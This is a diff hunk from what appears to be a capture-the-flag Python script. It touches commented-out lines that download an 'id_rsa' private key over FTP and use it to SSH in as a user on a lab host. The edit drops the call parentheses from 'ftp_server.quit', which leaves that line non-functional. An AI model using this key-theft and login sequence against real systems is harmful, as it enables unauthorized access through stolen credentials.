@@ -144,7 +144,7 @@ def spaceJam():
 #    ftp_server.encoding = 'utf-8'
 #    with open("id_rsa", "wb") as f:
 #        ftp_server.retrbinary(f"RETR id_rsa", f.write)
-#    ftp_server.quit()
+#    ftp_server.quit
 #    os.system("ssh -i id_rsa gcrawford@hackers.thm")
 
 if __name__ == "__main__":
